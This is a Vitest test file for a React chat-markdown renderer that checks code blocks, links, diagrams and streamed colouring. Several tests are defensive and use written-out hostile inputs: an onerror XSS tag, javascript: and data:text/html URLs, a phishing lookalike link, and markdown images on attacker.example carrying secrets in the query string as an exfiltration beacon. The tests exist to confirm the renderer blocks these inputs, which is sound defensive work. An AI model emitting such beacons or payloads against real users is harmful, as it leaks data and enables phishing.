import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { ChatMarkdown, toChatImage, toColorizedPrefix, toLinkDestination } from "./chat-markdown";

function render(text: string) {
  return renderToStaticMarkup(createElement(ChatMarkdown, { text }));
}

describe("chat markdown", () => {
  it("should render a fenced block as a code block with its language and a copy button", () => {
    const html = render('Try this:\n\n```ts\nexport const users = pgTable("users", {});\n```');

    expect(html).toContain('data-slot="chat-code"');
    expect(html).toMatch(/<span class="font-mono">ts<\/span>/);
    expect(html).toContain(">Copy<");
    expect(html).toContain("export const users = pgTable(&quot;users&quot;, {});</pre>");
    expect(html).not.toContain("rich-code");
  });

  it("should render inline code, bold and lists without a code block", () => {
    const html = render("The **first** argument of `pgTable`:\n\n- name\n- columns");

    expect(html).toContain('<code class="rich-code">pgTable</code>');
    expect(html).toMatch(/<strong[^>]*>first<\/strong>/);
    expect(html.match(/<li\b/g)).toHaveLength(2);
    expect(html).not.toContain('data-slot="chat-code"');
  });

  it("should set a list item's code block directly under its text, where its spacing applies", () => {
    const html = render('1. Name each column:\n   ```ts\n   createdAt: timestamp("created_at")\n   ```');

    expect(html).toMatch(/<li class="[^"]*">Name each column:\n?<div class="my-1 [^"]*" data-slot="chat-code">/);
  });

  it("should open links in a new tab and never render raw HTML", () => {
    const html = render("[Docs](https://orm.drizzle.team) <img src=x onerror=alert(1)>");

    expect(html).toMatch(/<a href="https:\/\/orm\.drizzle\.team" target="_blank" rel="noreferrer"/);
    expect(html).not.toContain("<img");
  });
});

describe("chat images", () => {
  const page = "https://drizzle.run";

  it("should draw data, blob and same-origin images in place", () => {
    expect(toChatImage("data:image/png;base64,iVBORw0KGgo=", page)).toEqual({
      kind: "inline",
      src: "data:image/png;base64,iVBORw0KGgo=",
    });
    expect(toChatImage("blob:https://drizzle.run/1f0c", page)?.kind).toBe("inline");
    expect(toChatImage("/favicon.svg", page)).toEqual({ kind: "inline", src: "https://drizzle.run/favicon.svg" });
  });

  it("should turn an image on another site into a link naming its host", () => {
    expect(toChatImage("https://attacker.example/beacon.png?secret=users", page)).toEqual({
      kind: "link",
      href: "https://attacker.example/beacon.png?secret=users",
      host: "attacker.example",
    });
  });

  it("should keep an image on a host the page policy allows as a link, since the chat decides on its own", () => {
    expect(toChatImage("https://avatars.githubusercontent.com/u/1?v=4&d=users", page)).toEqual({
      kind: "link",
      href: "https://avatars.githubusercontent.com/u/1?v=4&d=users",
      host: "avatars.githubusercontent.com",
    });
  });

  it("should refuse same-origin API paths, other schemes and non-image data URLs", () => {
    expect(toChatImage("/api/connect/rooms/abc", page)).toBeNull();
    expect(toChatImage("javascript:alert(1)", page)).toBeNull();
    expect(toChatImage("data:text/html,<script>alert(1)</script>", page)).toBeNull();
  });

  it("should never render a remote image as an img, so a reply cannot beacon out", () => {
    const html = render("Here is the schema ![users table](https://attacker.example/beacon.png?d=secret)");

    expect(html).not.toContain("<img");
    expect(html).toMatch(
      /<a href="https:\/\/attacker\.example\/beacon\.png\?d=secret" target="_blank"[^>]*data-slot="remote-image"/,
    );
    expect(html).toContain("users table</a>");
    expect(html).toContain("· attacker.example");
  });

  it("should draw a data URL image the agent drew", () => {
    const html = render("![schema](data:image/svg+xml;base64,PHN2Zy8+)");

    expect(html).toContain('<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="schema"');
  });
});

describe("chat links", () => {
  const page = "https://drizzle.run";

  it("should name the host of a link to another site", () => {
    expect(toLinkDestination("https://orm.drizzle.team/docs", page)).toBe("orm.drizzle.team");
    expect(toLinkDestination("mailto:someone@example.com", page)).toBe("email");
    expect(toLinkDestination("/projects", page)).toBeNull();
  });

  it("should show the real host beside a link whose text names another site", () => {
    const html = render("[https://orm.drizzle.team](https://drizzle-team.attacker.example/login)");

    expect(html).toContain("https://orm.drizzle.team</a>");
    expect(html).toMatch(/data-slot="link-destination">· drizzle-team\.attacker\.example</);
  });

  it("should not repeat the host of a bare URL", () => {
    const html = render("See https://orm.drizzle.team/docs");

    expect(html).not.toContain("link-destination");
  });
});

describe("chat diagrams", () => {
  it("should show a mermaid block's source until the diagram is drawn", () => {
    const html = render("```mermaid\nerDiagram\n  users ||--o{ posts : writes\n```");

    expect(html).toMatch(/data-slot="chat-diagram" data-state="loading"/);
    expect(html).toContain("users ||--o{ posts : writes");
  });

  it("should not draw a diagram that runs to the end of a streaming answer, and draw one that more text follows", () => {
    const diagram = "```mermaid\nerDiagram\n  users ||--o{ posts : writes";
    const open = renderToStaticMarkup(createElement(ChatMarkdown, { text: diagram, streaming: true }));
    const followed = renderToStaticMarkup(
      createElement(ChatMarkdown, { text: `${diagram}\n\`\`\`\n\nThen`, streaming: true }),
    );

    expect(open).not.toContain('data-slot="chat-diagram"');
    expect(open).toContain('data-slot="chat-code"');
    expect(followed).toMatch(/data-slot="chat-diagram" data-state="loading"/);
  });
});

describe("toColorizedPrefix", () => {
  const colorized = {
    code: "const a = 1;\nconst b",
    html: '<span class="mtk1">const a = 1;</span><br/><span class="mtk1">const b</span><br/>',
  };

  it("should keep the whole lines colored last time and leave the grown rest plain", () => {
    expect(toColorizedPrefix(colorized, "const a = 1;\nconst b = 2;\nconst c")).toEqual({
      html: '<span class="mtk1">const a = 1;</span><br/>',
      rest: "const b = 2;\nconst c",
    });
  });

  it("should give nothing when the code no longer starts with those lines, or had no whole line", () => {
    expect(toColorizedPrefix(colorized, "let a = 1;\nconst b")).toBeUndefined();
    expect(toColorizedPrefix({ code: "const a", html: '<span class="mtk1">const a</span><br/>' }, "const ab")).toBe(
      undefined,
    );
  });
});
